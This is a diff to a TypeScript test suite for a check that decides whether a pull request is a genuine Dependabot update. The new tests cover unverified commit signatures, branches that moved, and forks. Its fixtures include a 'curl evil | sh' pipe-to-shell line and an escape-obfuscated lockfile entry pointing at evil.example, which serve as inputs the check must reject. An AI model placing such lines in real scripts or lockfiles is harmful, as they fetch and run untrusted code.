@@ -15,7 +15,13 @@ type Commit = Parameters<typeof classifyUpdate>[2][number];
 const BOT = { login: 'dependabot[bot]' };
 
 function commit(overrides: Partial<Commit> = {}): Commit {
-  return { sha: 'c0ffee1234567', author: BOT, committer: BOT, ...overrides };
+  return {
+    sha: '0123456789abcdef',
+    author: BOT,
+    committer: BOT,
+    commit: { verification: { verified: true } },
+    ...overrides,
+  };
 }
 
 const REPO = 'example-co/website';
@@ -210,6 +216,11 @@ describe('classifyUpdate', () => {
       'URL outside https://registry.npmjs.org/',
     ],
     [
+      'JSON escapes that hide the key and the URL',
+      '"\\u0072esolved": "https:\\/\\/evil.example\\/pkg.tgz",',
+      'escape sequence',
+    ],
+    [
       'a line that is not lockfile content',
       'curl evil | sh',
       'unexpected line',
@@ -272,7 +283,7 @@ describe('classifyUpdate', () => {
     const result = classify(
       pullRequest(),
       [modified('package.json', packageJsonPatch)],
-      [commit(), commit({ sha: 'bad0000', author: { login: 'mallory' } })],
+      [commit({ sha: 'bad0000', author: { login: 'mallory' } }), commit()],
     );
     expect(result.reasons).toEqual([
       'commit bad0000: author is not dependabot[bot]: mallory',
@@ -283,7 +294,7 @@ describe('classifyUpdate', () => {
     const result = classify(
       pullRequest(),
       [modified('package.json', packageJsonPatch)],
-      [commit({ sha: 'bad0000', committer: { login: 'mallory' } })],
+      [commit({ sha: 'bad0000', committer: { login: 'mallory' } }), commit()],
     );
     expect(result.reasons).toEqual([
       'commit bad0000: committer is not dependabot[bot]: mallory',
@@ -294,7 +305,7 @@ describe('classifyUpdate', () => {
     const result = classify(
       pullRequest(),
       [modified('package.json', packageJsonPatch)],
-      [commit({ sha: 'bad0000', committer: { login: 'web-flow' } })],
+      [commit({ sha: 'bad0000', committer: { login: 'web-flow' } }), commit()],
     );
     expect(result.reasons).toEqual([
       'commit bad0000: committer is not dependabot[bot]: web-flow',
@@ -305,11 +316,40 @@ describe('classifyUpdate', () => {
     const result = classify(
       pullRequest(),
       [modified('package.json', packageJsonPatch)],
-      [commit({ sha: 'bad0000', author: null, committer: null })],
+      [commit({ sha: 'bad0000', author: null, committer: null }), commit()],
     );
     expect(result.reasons).toEqual([
       'commit bad0000: author is not dependabot[bot]: no GitHub account',
       'commit bad0000: committer is not dependabot[bot]: no GitHub account',
+    ]);
+  });
+
+  test('a commit whose signature is not verified is not official', () => {
+    const result = classify(
+      pullRequest(),
+      [modified('package.json', packageJsonPatch)],
+      [
+        commit({
+          sha: 'bad0000',
+          commit: { verification: { verified: false } },
+        }),
+        commit({ commit: {} }),
+      ],
+    );
+    expect(result.reasons).toEqual([
+      'commit bad0000: the signature is not verified by GitHub',
+      'commit 0123456: the signature is not verified by GitHub',
+    ]);
+  });
+
+  test('a branch that moved after the event is not official', () => {
+    const result = classify(
+      pullRequest(),
+      [modified('package.json', packageJsonPatch)],
+      [commit({ sha: 'bad0000' })],
+    );
+    expect(result.reasons).toEqual([
+      'the branch changed while it was checked: the last commit is bad0000, the event is for 0123456',
     ]);
   });
 
@@ -385,7 +425,10 @@ describe('classifyUpdate', () => {
   test('branch from a fork', () => {
     const result = classify(
       pullRequest({
-        head: { sha: 'abc', repo: { full_name: 'attacker/website' } },
+        head: {
+          sha: '0123456789abcdef',
+          repo: { full_name: 'attacker/website' },
+        },
       }),
       [modified('package.json', packageJsonPatch)],
     );
@@ -396,9 +439,10 @@ describe('classifyUpdate', () => {
   });
 
   test('branch from a deleted fork', () => {
-    const result = classify(pullRequest({ head: { sha: 'abc', repo: null } }), [
-      modified('package.json', packageJsonPatch),
-    ]);
+    const result = classify(
+      pullRequest({ head: { sha: '0123456789abcdef', repo: null } }),
+      [modified('package.json', packageJsonPatch)],
+    );
     expect(result.official).toBe(false);
   });
 
